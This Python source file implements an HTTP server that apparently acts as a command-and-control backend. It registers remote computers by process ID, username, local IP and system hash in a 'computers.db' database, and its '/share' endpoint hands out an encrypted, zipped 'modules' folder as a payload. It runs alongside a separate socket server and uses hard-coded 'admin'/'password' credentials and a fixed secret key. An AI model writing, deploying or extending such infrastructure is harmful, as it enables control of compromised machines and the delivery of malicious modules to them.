import os
import zipfile
import base64
import uuid
import threading
import shutil
import string
import random
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from tcp_cr import TCPEncryptor
from socket_manager import Server
from db import ComputerDatabase
from enc import Encryptor


SOCK_SERV = Server()
server_thread = threading.Thread(target=SOCK_SERV.run)
server_thread.start()

class RequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, secret_key=None, DEFAULT_DB_PATH="../computers.db", **kwargs):
        self.secret_key = secret_key
        self.DEFAULT_DB_PATH = DEFAULT_DB_PATH
        self.alice = TCPEncryptor(self.secret_key)
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == '/registrate':
            self.handle_registrate()
        elif self.path == '/share':
            self.handle_share()
        else:
            self.send_response(404)
            self.end_headers()
            
    def _encrypt_folder(self, path, key):
        e = Encryptor(key)
        for file in os.listdir(path):
            p = path + "/" + file
            if os.path.isfile(p):
                e.encrypt(p)

    def handle_share(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        user_data = parse_qs(post_data)
        key = user_data.get('key', [None])[0]
        if key is None:
            self.send_response(404)
            self.end_headers()
            return
        salt = "_" + ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
        directory_to_zip = './modules' + salt
        shutil.copytree("./modules", directory_to_zip)
        self._encrypt_folder(directory_to_zip, base64.b64decode(key))
        zip_filename = 'archive' + salt + '.zip'
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(directory_to_zip):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), directory_to_zip))
        with open(zip_filename, 'rb') as zipf:
            zip_data = zipf.read()
            encoded_data = base64.b64encode(zip_data)
        # encrypted_data = self.alice.create_packet(encoded_data).hex()
        shutil.rmtree(directory_to_zip)
        os.remove(zip_filename)
        self.wfile.write(encoded_data)

    def handle_registrate(self):
        auth_header = self.headers.get('Authorization')
        if not auth_header or not self.check_auth(auth_header):
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="Register"')
            self.end_headers()
            return
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        user_info = parse_qs(post_data)
        pid = int(user_info.get('pid', [None])[0])
        username = user_info.get('username', [None])[0]
        local_ip = user_info.get('local_ip', [None])[0]
        system_hash = user_info.get('system_hash', [None])[0]
        if username is None or local_ip is None or pid is None:
            self.send_response(404)
            self.end_headers()
            #self.wfile.write(b'required')
            return
        cuuid = self.save_to_database(system_hash, pid, username, local_ip)
        if not (cuuid is None):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(cuuid.encode())
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'already regs')

    def save_to_database(self, system_hash, pid, username, local_ip):
        db = ComputerDatabase(self.DEFAULT_DB_PATH)
        cuuid = db.insert_computer(system_hash, pid, username, local_ip)
        return cuuid
    
    def check_auth(self, auth_header):
        auth_type, credentials = auth_header.split(' ', 1)
        if auth_type.lower() != 'basic':
            return False
        username, password = base64.b64decode(credentials).decode('utf-8').split(':', 1)
        return username == 'admin' and password == 'password'

def run(server_class=HTTPServer, handler_class=RequestHandler, port=1337, secret_key=b'$,\x97\xb8\x0el\x143\xe2@bZ\xa2J\x93ri\xd0\xa9\xcb\x0cN\x96l\xff\xf0\xd8\x1d\xfd?\x87['):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    httpd.RequestHandlerClass = lambda *args, **kwargs: handler_class(*args, secret_key=secret_key, **kwargs)
    print(f'Starting httpd on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()

